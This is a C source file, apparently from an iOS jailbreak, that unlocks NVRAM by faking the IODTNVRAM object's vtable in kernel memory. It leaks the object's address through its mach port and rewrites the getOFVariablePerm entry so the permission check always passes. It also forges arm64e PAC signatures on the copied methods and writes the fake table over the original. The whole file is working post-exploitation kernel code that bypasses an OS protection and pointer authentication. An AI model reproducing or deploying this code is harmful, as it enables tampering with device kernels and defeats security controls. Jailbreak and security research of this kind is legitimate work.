// iOS 11 moves OFVariables to const
// https://twitter.com/s1guza/status/908790514178301952
// however, if we:
//  1) Can find IODTNVRAM service
//  2) Have tfp0 / kernel read|write|alloc
//  3) Can leak kernel address of mach port
// then we can fake vtable on IODTNVRAM object

#include <stdlib.h>
#include <CoreFoundation/CoreFoundation.h>
#include "remap_tfp_set_hsp.h"
#include "OffsetHolder.h"
#include "iokit.h"
#include "IOKitLibTW.h" //added for errors
#include "common.h"
#include "find_port.h"
#include "pac.h"
#include "KernelUtils.h"
#include "PFOffs.h"
#include "kernel_call.h"
#include "kernel_exec.h"
#include "kc_parameters.h"
#include "vnode_utils.h"
#include "OSObj.h"
#include <pthread.h>

static const size_t max_vtable_size = 0x1000;
static const size_t kernel_buffer_size = 0x4000;

// it always returns false
static const uint64_t searchNVRAMProperty = 0x590;
// 0 corresponds to root only
static const uint64_t getOFVariablePerm = 0x558;

// convertPropToObject calls getOFVariableType
// open convertPropToObject, look for first vtable call -- that'd be getOFVariableType
// find xrefs, figure out vtable start from that
// following are offsets of entries in vtable

kptr_t proc_struct_addr()
{
    return get_proc_struct_for_pid(getpid());
}

uint64_t get_address_of_port_OWO(uint64_t proc, mach_port_t port)
{
    uint64_t const task_addr = ReadKernel64(proc + koffset(KSTRUCT_OFFSET_PROC_TASK));
    uint64_t const itk_space = ReadKernel64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
    uint64_t const is_table = ReadKernel64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
    uint64_t const port_addr = ReadKernel64(is_table + (MACH_PORT_INDEX(port) * koffset(KSTRUCT_SIZE_IPC_ENTRY)));
    return port_addr;
}

kptr_t IOMalloc(vm_size_t size) {
    kptr_t ret = KPTR_NULL;
    kptr_t const function = GETOFFSET(IOMalloc);
    ret = kexecute2(function, (kptr_t)size, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL);
    if (ret != KPTR_NULL) ret = zm_fix_addr2(ret);
out:;
    return ret;
}

void IOFree(kptr_t address, vm_size_t size) {
    kptr_t const function = GETOFFSET(IOFree);
    kexecute2(function, address, (kptr_t)size, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL, KPTR_NULL);
}

#define SafeIOFree(x, size) do { if (KERN_POINTER_VALID(x)) IOFree(x, size); } while(false)
#define SafeIOFreeNULL(x, size) do { SafeIOFree(x, size); (x) = KPTR_NULL; } while(false)



// get kernel address of IODTNVRAM object
uint64_t get_iodtnvram_obj(void) {
    static uint64_t IODTNVRAMObj = 0;
    
    if (IODTNVRAMObj == 0) {
        sched_yield();
        io_service_t IODTNVRAMSrv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IODTNVRAM"));
        sched_yield();

        if (!MACH_PORT_VALID(IODTNVRAMSrv)) {
            util_error("Failed to get IODTNVRAM service");
            return 0;
        }
        sched_yield();
        uint64_t nvram_up = get_address_of_port_OWO(proc_struct_addr(), IODTNVRAMSrv);
        sched_yield();
        IODTNVRAMObj = ReadKernel64(nvram_up + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        sched_yield();

        util_info("IODTNVRAM obj at 0x%llx", IODTNVRAMObj);
    }
    
    return IODTNVRAMObj;
}

uint64_t orig_vtable = 0;
uint64_t fake_vtable = 0;
uint64_t fake_vtable_xpac = 0;

int unlocknvram(void) {
    uint64_t obj = get_iodtnvram_obj();
    if (obj == 0) {
        util_error("get_iodtnvram_obj failed!");
        return 1;
    }
    orig_vtable = ReadKernel64(obj);
    sched_yield();
    uint64_t vtable_xpac = kernel_xpacd(orig_vtable);
    
    uint64_t *buf = calloc(1, max_vtable_size);
    kreadOwO(vtable_xpac, buf, max_vtable_size);
    sched_yield();

    // alter it
    buf[getOFVariablePerm / sizeof(uint64_t)] = \
    kernel_xpaci(buf[searchNVRAMProperty / sizeof(uint64_t)]);
    sched_yield();

    // allocate buffer in kernel
    fake_vtable_xpac = IOMalloc(kernel_buffer_size);
    sched_yield();

    // Forge the pacia pointers to the virtual methods.
    size_t count = 0;
    for (; count < max_vtable_size / sizeof(*buf); count++) {
        uint64_t vmethod = buf[count];
        if (vmethod == 0) {
            break;
        }
#if __arm64e__
        assert(count < VTABLE_PAC_CODES(IODTNVRAM).count);
        vmethod = kernel_xpaci(vmethod);
        uint64_t vmethod_address = fake_vtable_xpac + count * sizeof(*buf);
        buf[count] = kernel_forge_pacia_with_type(vmethod, vmethod_address,
                                                  VTABLE_PAC_CODES(IODTNVRAM).codes[count]);
#endif // __arm64e__
    }
    sched_yield();

    // and copy it back
    kwriteOwO(fake_vtable_xpac, buf, count*sizeof(*buf));
#if __arm64e__
    fake_vtable = kernel_forge_pacda(fake_vtable_xpac, 0);
#else
    fake_vtable = fake_vtable_xpac;
#endif
    usleep(20000);
    sched_yield();

    // replace vtable on IODTNVRAM object
    WriteKernel64(obj, fake_vtable);
    sched_yield();

    free(buf);
    buf = NULL;
    util_info("Unlocked nvram");
    return 0;
}

int locknvram(void) {
    if (orig_vtable == 0 || fake_vtable_xpac == 0) {
        util_error("Trying to lock nvram, but didnt unlock first");
        return -1;
    }
    
    uint64_t obj = get_iodtnvram_obj();
    sched_yield();
    if (obj == 0) { // would never happen but meh
        util_error("get_iodtnvram_obj failed!");
        return 1;
    }
    
    WriteKernel64(obj, orig_vtable);
    SafeIOFreeNULL(fake_vtable_xpac, kernel_buffer_size);
    
    util_info("Locked nvram");
    return 0;
}
